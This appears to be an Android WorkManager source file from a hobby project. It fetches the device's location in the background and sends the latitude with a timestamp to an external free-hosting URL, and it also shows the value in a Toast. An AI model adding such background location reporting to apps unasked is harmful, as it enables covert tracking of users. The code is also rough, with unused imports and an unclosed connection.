package com.example.service;

import static androidx.core.content.ContextCompat.getSystemService;
import static androidx.core.content.ContextCompat.isDeviceProtectedStorage;
import static androidx.core.content.ContextCompat.startForegroundService;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Message;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;
import java.util.HashMap;

import javax.net.ssl.HttpsURLConnection;

public class Workmanager extends Worker {

    public Workmanager(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Handler handler = new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(@NonNull Message msg) {
                super.handleMessage(msg);
                Bundle bundle = msg.getData();
                Toast.makeText(getApplicationContext(), String.valueOf(bundle.getDouble("lat")), Toast.LENGTH_SHORT).show();
            }
        };
        HandlerThread th = new HandlerThread("ankit");
        th.start();
        LocationManager lm = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return Result.failure();
        }
        lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, new LocationListener() {
                    @Override
                    public void onLocationChanged(@NonNull Location location) {
                        Bundle bundle = new Bundle();
                        bundle.putDouble("lat",location.getLatitude());
                        try
                        {
                            URL url=new URL("https://onpress.000webhostapp.com/index.php?time="+String.valueOf(location.getLatitude())+Calendar.getInstance().getTime().toString());
                            HttpsURLConnection connection= (HttpsURLConnection) url.openConnection();
                            InputStream inputStream=connection.getInputStream();
                        }
                        catch (Exception e)
                        {
                            System.out.println(e);
                        }

                        System.out.println(location.getLatitude());
                        Message message = new Message();
                        message.setData(bundle);
                        handler.sendMessage(message);
                    }
                }
                , th.getLooper()

        );


        System.out.println("Working>>>");
        return Result.success();
    }

}
